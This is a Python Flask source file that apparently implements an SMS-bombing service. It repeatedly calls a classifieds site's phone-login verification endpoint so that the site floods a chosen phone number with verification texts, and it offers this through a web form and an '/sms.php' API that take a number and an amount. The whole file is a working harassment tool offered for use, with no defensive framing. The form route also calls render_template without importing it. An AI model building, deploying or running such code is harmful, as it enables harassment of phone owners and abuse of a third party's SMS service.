from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

def send_sms(phone_number, count):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_number}"

    success_count = 0
    messages = []
    for i in range(count):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                success_count += 1
            else:
                messages.append(f"Failed to send SMS {i+1}. Status code: {response.status_code}. Response: {response.text}")
        except requests.exceptions.RequestException as e:
            messages.append(f"An error occurred while sending SMS {i+1}: {e}")

    if success_count == count:
        messages.append(f"All {count} SMS sent successfully.")
    elif success_count > 0:
        messages.append(f"{success_count} out of {count} SMS sent successfully.")

    return messages

@app.route('/', methods=['GET', 'POST'])
def index():
    messages = []
    if request.method == 'POST':
        phone_number = request.form['phone_number']
        count = int(request.form['count'])
        messages = send_sms(phone_number, count)
        return render_template('index.html', messages=messages)
    return render_template('index.html', messages=messages)

@app.route('/sms.php', methods=['GET'])
def sms_api():
    phone_number = request.args.get('number')
    amount = request.args.get('amount')
    
    if not phone_number or not amount:
        return jsonify({'error': 'Number and amount are required'}), 400
    
    try:
        count = int(amount)
    except ValueError:
        return jsonify({'error': 'Amount must be a number'}), 400

    messages = send_sms(phone_number, count)
    return jsonify({'messages': messages})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 81))
    app.run(host='0.0.0.0', port=port)
